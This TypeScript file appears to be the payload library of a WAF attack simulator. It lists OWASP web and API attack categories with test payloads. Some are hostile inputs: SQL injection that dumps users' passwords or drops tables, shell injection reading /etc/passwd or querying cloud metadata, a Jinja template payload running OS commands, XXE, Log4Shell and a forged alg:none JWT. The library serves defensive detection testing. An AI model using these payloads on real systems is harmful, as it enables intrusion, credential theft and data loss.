// ═══════════════════════════════════════════════════════════════════════════
// WAF Attack Simulator — Curated Attack Library
//
// Coverage: OWASP Top 10 (web, WAF-detectable) + OWASP API Security Top 10,
// 2–3 payloads per category. Each "prodSafe" payload is a signature-triggering
// string intended to trip WAF detection without being a working exploit against
// an origin. "fullStrength" variants are opt-in and meant for non-prod targets.
//
// This library is intentionally pluggable — add categories/payloads here and the
// rest of the tool (UI selectors, runner, report) picks them up automatically.
// ═══════════════════════════════════════════════════════════════════════════

import type { AttackCategory, AttackPayload } from './types';

export const ATTACK_CATEGORIES: AttackCategory[] = [
  // ── OWASP WAF / Web Top 10 ────────────────────────────────────────────────
  { id: 'sqli', family: 'WAF', name: 'SQL Injection', owasp: 'A03:2021 Injection', description: 'Database query manipulation via crafted input.', defaultEnabled: true },
  { id: 'xss', family: 'WAF', name: 'Cross-Site Scripting (XSS)', owasp: 'A03:2021 Injection', description: 'Script injection into responses rendered by a browser.', defaultEnabled: true },
  { id: 'cmdi', family: 'WAF', name: 'Command Injection', owasp: 'A03:2021 Injection', description: 'OS command execution via unsanitized input.', defaultEnabled: true },
  { id: 'traversal', family: 'WAF', name: 'Path Traversal / LFI', owasp: 'A01:2021 Broken Access Control', description: 'Directory traversal and local file inclusion.', defaultEnabled: true },
  { id: 'ssrf', family: 'WAF', name: 'SSRF', owasp: 'A10:2021 SSRF', description: 'Server-side request forgery to internal/metadata endpoints.', defaultEnabled: true },
  { id: 'xxe', family: 'WAF', name: 'XML External Entity (XXE)', owasp: 'A05:2021 Security Misconfiguration', description: 'External-entity expansion in XML parsers.', defaultEnabled: true },
  { id: 'ssti', family: 'WAF', name: 'Server-Side Template Injection', owasp: 'A03:2021 Injection', description: 'Template engine expression evaluation.', defaultEnabled: true },
  { id: 'rce', family: 'WAF', name: 'RCE / Deserialization', owasp: 'A08:2021 Integrity Failures', description: 'Known RCE strings (Log4Shell, PHP wrappers).', defaultEnabled: true },
  { id: 'misconfig', family: 'WAF', name: 'Sensitive File / Misconfig', owasp: 'A05:2021 Security Misconfiguration', description: 'Probes for exposed secrets and admin files.', defaultEnabled: true },
  { id: 'protocol', family: 'WAF', name: 'Protocol / Header Abuse', owasp: 'A03:2021 Injection', description: 'CRLF / response-splitting / host header injection.', defaultEnabled: true },

  // ── OWASP API Security Top 10 ─────────────────────────────────────────────
  { id: 'api-bola', family: 'API', name: 'BOLA / IDOR', owasp: 'API1:2023 BOLA', description: 'Object-ID enumeration / access-control bypass.', defaultEnabled: true },
  { id: 'api-auth', family: 'API', name: 'Broken Authentication', owasp: 'API2:2023 Broken Authentication', description: 'Missing/forged tokens, alg:none JWT.', defaultEnabled: true },
  { id: 'api-mass', family: 'API', name: 'Mass Assignment / BOPLA', owasp: 'API3:2023 Broken Object Property Level Auth', description: 'Privilege-escalating property injection.', defaultEnabled: true },
  { id: 'api-bfla', family: 'API', name: 'Broken Function Level Auth', owasp: 'API5:2023 BFLA', description: 'Privileged methods/functions on a resource.', defaultEnabled: true },
  { id: 'api-ssrf', family: 'API', name: 'API SSRF', owasp: 'API7:2023 SSRF', description: 'SSRF via API URL parameters.', defaultEnabled: true },
  { id: 'api-misconfig', family: 'API', name: 'API Misconfiguration', owasp: 'API8:2023 Security Misconfiguration', description: 'Debug/actuator endpoints, unsafe methods.', defaultEnabled: true },
];

export const ATTACK_PAYLOADS: AttackPayload[] = [
  // ── SQL Injection ─────────────────────────────────────────────────────────
  { id: 'sqli-1', categoryId: 'sqli', name: 'Boolean-based auth bypass', severity: 'CRITICAL', vector: 'QUERY', methods: ['GET', 'POST'], paramName: 'id', prodSafe: "' OR '1'='1' -- ", fullStrength: "' OR '1'='1' UNION SELECT username,password FROM users -- ", expectedSignature: 'SQL injection — tautology / UNION SELECT' },
  { id: 'sqli-2', categoryId: 'sqli', name: 'UNION SELECT', severity: 'CRITICAL', vector: 'QUERY', methods: ['GET'], paramName: 'q', prodSafe: "1' UNION SELECT NULL,NULL -- ", expectedSignature: 'SQL injection — UNION-based extraction' },
  { id: 'sqli-3', categoryId: 'sqli', name: 'Stacked / destructive query', severity: 'CRITICAL', vector: 'BODY', methods: ['POST'], paramName: 'search', bodyType: 'form', prodSafe: "x'; SELECT pg_sleep(0) -- ", fullStrength: "x'; DROP TABLE users; -- ", expectedSignature: 'SQL injection — stacked queries' },

  // ── XSS ───────────────────────────────────────────────────────────────────
  { id: 'xss-1', categoryId: 'xss', name: 'Reflected script tag', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'q', prodSafe: '<script>alert(1)</script>', expectedSignature: 'XSS — inline <script> tag' },
  { id: 'xss-2', categoryId: 'xss', name: 'Event-handler injection', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'name', prodSafe: '"><img src=x onerror=alert(1)>', expectedSignature: 'XSS — attribute breakout / event handler' },
  { id: 'xss-3', categoryId: 'xss', name: 'JS URI scheme', severity: 'MEDIUM', vector: 'BODY', methods: ['POST'], paramName: 'bio', bodyType: 'json', prodSafe: 'javascript:alert(document.domain)', expectedSignature: 'XSS — javascript: URI' },

  // ── Command Injection ─────────────────────────────────────────────────────
  { id: 'cmdi-1', categoryId: 'cmdi', name: 'Semicolon chain', severity: 'CRITICAL', vector: 'QUERY', methods: ['GET', 'POST'], paramName: 'host', prodSafe: '; cat /etc/passwd', expectedSignature: 'Command injection — shell metacharacters' },
  { id: 'cmdi-2', categoryId: 'cmdi', name: 'Pipe to command', severity: 'CRITICAL', vector: 'QUERY', methods: ['GET'], paramName: 'cmd', prodSafe: '| id', expectedSignature: 'Command injection — pipe' },
  { id: 'cmdi-3', categoryId: 'cmdi', name: 'Subshell substitution', severity: 'CRITICAL', vector: 'BODY', methods: ['POST'], paramName: 'target', bodyType: 'form', prodSafe: '$(whoami)', fullStrength: '$(curl http://169.254.169.254/latest/meta-data/)', expectedSignature: 'Command injection — $() substitution' },

  // ── Path Traversal / LFI ──────────────────────────────────────────────────
  { id: 'traversal-1', categoryId: 'traversal', name: 'Classic ../ traversal', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'file', prodSafe: '../../../../etc/passwd', expectedSignature: 'Path traversal — ../ sequences' },
  { id: 'traversal-2', categoryId: 'traversal', name: 'URL-encoded traversal', severity: 'HIGH', vector: 'PATH', methods: ['GET'], prodSafe: '..%2f..%2f..%2f..%2fetc%2fpasswd', expectedSignature: 'Path traversal — encoded ../' },
  { id: 'traversal-3', categoryId: 'traversal', name: 'Nested-dot bypass', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'page', prodSafe: '....//....//....//etc/passwd', expectedSignature: 'Path traversal — evasion variant' },

  // ── SSRF ──────────────────────────────────────────────────────────────────
  { id: 'ssrf-1', categoryId: 'ssrf', name: 'Cloud metadata endpoint', severity: 'CRITICAL', vector: 'QUERY', methods: ['GET', 'POST'], paramName: 'url', prodSafe: 'http://169.254.169.254/latest/meta-data/', expectedSignature: 'SSRF — link-local metadata IP' },
  { id: 'ssrf-2', categoryId: 'ssrf', name: 'Loopback access', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'target', prodSafe: 'http://127.0.0.1:80/', expectedSignature: 'SSRF — loopback address' },
  { id: 'ssrf-3', categoryId: 'ssrf', name: 'file:// scheme', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'resource', prodSafe: 'file:///etc/passwd', expectedSignature: 'SSRF / LFI — file:// scheme' },

  // ── XXE ───────────────────────────────────────────────────────────────────
  { id: 'xxe-1', categoryId: 'xxe', name: 'External entity file read', severity: 'HIGH', vector: 'BODY', methods: ['POST', 'PUT'], bodyType: 'xml', prodSafe: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', expectedSignature: 'XXE — SYSTEM external entity' },
  { id: 'xxe-2', categoryId: 'xxe', name: 'Parameter entity (OOB)', severity: 'HIGH', vector: 'BODY', methods: ['POST'], bodyType: 'xml', prodSafe: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://169.254.169.254/">%p;]><r/>', expectedSignature: 'XXE — parameter entity / OOB' },

  // ── SSTI ──────────────────────────────────────────────────────────────────
  { id: 'ssti-1', categoryId: 'ssti', name: 'Jinja/Twig expression', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'name', prodSafe: '{{7*7}}', fullStrength: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", expectedSignature: 'SSTI — {{ }} expression' },
  { id: 'ssti-2', categoryId: 'ssti', name: 'EL / Spring expression', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'q', prodSafe: '${7*7}', expectedSignature: 'SSTI — ${ } expression' },
  { id: 'ssti-3', categoryId: 'ssti', name: 'ERB / ASP expression', severity: 'MEDIUM', vector: 'BODY', methods: ['POST'], paramName: 'tpl', bodyType: 'form', prodSafe: '<%= 7*7 %>', expectedSignature: 'SSTI — <%= %> expression' },

  // ── RCE / Deserialization ─────────────────────────────────────────────────
  { id: 'rce-1', categoryId: 'rce', name: 'Log4Shell JNDI', severity: 'CRITICAL', vector: 'HEADER', methods: ['GET', 'POST'], headerName: 'User-Agent', prodSafe: '${jndi:ldap://example.com/a}', expectedSignature: 'RCE — Log4Shell JNDI lookup' },
  { id: 'rce-2', categoryId: 'rce', name: 'PHP filter wrapper', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'page', prodSafe: 'php://filter/convert.base64-encode/resource=index.php', expectedSignature: 'RCE/LFI — php:// stream wrapper' },
  { id: 'rce-3', categoryId: 'rce', name: 'Java deserialization marker', severity: 'HIGH', vector: 'BODY', methods: ['POST'], bodyType: 'json', prodSafe: '{"@type":"java.net.Inet4Address","val":"example.com"}', expectedSignature: 'Insecure deserialization — fastjson @type' },

  // ── Sensitive File / Misconfig ────────────────────────────────────────────
  { id: 'misconfig-1', categoryId: 'misconfig', name: '.env secrets file', severity: 'HIGH', vector: 'PATH', methods: ['GET'], prodSafe: '.env', expectedSignature: 'Sensitive file — environment secrets' },
  { id: 'misconfig-2', categoryId: 'misconfig', name: '.git exposure', severity: 'MEDIUM', vector: 'PATH', methods: ['GET'], prodSafe: '.git/config', expectedSignature: 'Sensitive file — exposed VCS metadata' },
  { id: 'misconfig-3', categoryId: 'misconfig', name: 'App config probe', severity: 'MEDIUM', vector: 'PATH', methods: ['GET'], prodSafe: 'wp-config.php.bak', expectedSignature: 'Sensitive file — backup config' },

  // ── Protocol / Header Abuse ───────────────────────────────────────────────
  { id: 'protocol-1', categoryId: 'protocol', name: 'CRLF response splitting', severity: 'MEDIUM', vector: 'QUERY', methods: ['GET'], paramName: 'redirect', prodSafe: '%0d%0aSet-Cookie:%20sessionid=hijacked', expectedSignature: 'CRLF injection — header/response splitting' },
  { id: 'protocol-2', categoryId: 'protocol', name: 'Host header injection', severity: 'MEDIUM', vector: 'HEADER', methods: ['GET'], headerName: 'X-Forwarded-Host', prodSafe: 'evil.example.com', expectedSignature: 'Host header injection / cache poisoning' },

  // ── API: BOLA / IDOR (enumeration sequence handled by runner) ──────────────
  { id: 'api-bola-1', categoryId: 'api-bola', name: 'Sequential object ID', severity: 'HIGH', vector: 'PATH', methods: ['GET'], prodSafe: '1', expectedSignature: 'BOLA — direct object reference' },
  { id: 'api-bola-2', categoryId: 'api-bola', name: 'Adjacent object ID', severity: 'HIGH', vector: 'PATH', methods: ['GET'], prodSafe: '1001', expectedSignature: 'BOLA — adjacent object enumeration' },
  { id: 'api-bola-3', categoryId: 'api-bola', name: 'UUID/role param tamper', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'user_id', prodSafe: '00000000-0000-0000-0000-000000000001', expectedSignature: 'BOLA — identifier tampering' },

  // ── API: Broken Authentication ────────────────────────────────────────────
  { id: 'api-auth-1', categoryId: 'api-auth', name: 'Null bearer token', severity: 'HIGH', vector: 'HEADER', methods: ['GET', 'POST'], headerName: 'Authorization', prodSafe: 'Bearer null', expectedSignature: 'Broken auth — null/empty token accepted' },
  { id: 'api-auth-2', categoryId: 'api-auth', name: 'JWT alg:none', severity: 'CRITICAL', vector: 'HEADER', methods: ['GET'], headerName: 'Authorization', prodSafe: 'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.', expectedSignature: 'Broken auth — JWT alg:none forgery' },

  // ── API: Mass Assignment / BOPLA ──────────────────────────────────────────
  { id: 'api-mass-1', categoryId: 'api-mass', name: 'Role escalation property', severity: 'HIGH', vector: 'BODY', methods: ['POST', 'PUT', 'PATCH'], bodyType: 'json', prodSafe: '{"role":"admin","isAdmin":true}', expectedSignature: 'Mass assignment — privileged property injection' },
  { id: 'api-mass-2', categoryId: 'api-mass', name: 'Account flag tamper', severity: 'MEDIUM', vector: 'BODY', methods: ['PUT', 'PATCH'], bodyType: 'json', prodSafe: '{"verified":true,"balance":999999,"account_type":"premium"}', expectedSignature: 'BOPLA — writable sensitive property' },

  // ── API: Broken Function Level Authorization ──────────────────────────────
  { id: 'api-bfla-1', categoryId: 'api-bfla', name: 'Privileged DELETE', severity: 'HIGH', vector: 'PATH', methods: ['DELETE'], prodSafe: '1', expectedSignature: 'BFLA — unauthorized privileged method' },
  { id: 'api-bfla-2', categoryId: 'api-bfla', name: 'Admin function path', severity: 'HIGH', vector: 'PATH', methods: ['GET', 'POST'], prodSafe: 'admin/users', expectedSignature: 'BFLA — admin function access' },

  // ── API: SSRF ─────────────────────────────────────────────────────────────
  { id: 'api-ssrf-1', categoryId: 'api-ssrf', name: 'Webhook/callback SSRF', severity: 'HIGH', vector: 'BODY', methods: ['POST'], bodyType: 'json', prodSafe: '{"url":"http://169.254.169.254/latest/meta-data/","callback":"http://127.0.0.1:80/"}', expectedSignature: 'API SSRF — internal URL in body' },
  { id: 'api-ssrf-2', categoryId: 'api-ssrf', name: 'Image/fetch URL SSRF', severity: 'HIGH', vector: 'QUERY', methods: ['GET'], paramName: 'image_url', prodSafe: 'http://metadata.google.internal/computeMetadata/v1/', expectedSignature: 'API SSRF — fetch URL parameter' },

  // ── API: Misconfiguration ─────────────────────────────────────────────────
  { id: 'api-misconfig-1', categoryId: 'api-misconfig', name: 'Spring actuator env', severity: 'MEDIUM', vector: 'PATH', methods: ['GET'], prodSafe: 'actuator/env', expectedSignature: 'API misconfig — exposed actuator' },
  { id: 'api-misconfig-2', categoryId: 'api-misconfig', name: 'Unsafe TRACE method', severity: 'LOW', vector: 'PATH', methods: ['OPTIONS'], prodSafe: '', expectedSignature: 'API misconfig — dangerous HTTP method' },
  { id: 'api-misconfig-3', categoryId: 'api-misconfig', name: 'Swagger/OpenAPI exposure', severity: 'LOW', vector: 'PATH', methods: ['GET'], prodSafe: 'swagger-ui.html', expectedSignature: 'API misconfig — exposed API docs' },
];

export function payloadsForCategories(categoryIds: string[]): AttackPayload[] {
  const set = new Set(categoryIds);
  return ATTACK_PAYLOADS.filter((p) => set.has(p.categoryId));
}

export function getCategory(id: string): AttackCategory | undefined {
  return ATTACK_CATEGORIES.find((c) => c.id === id);
}
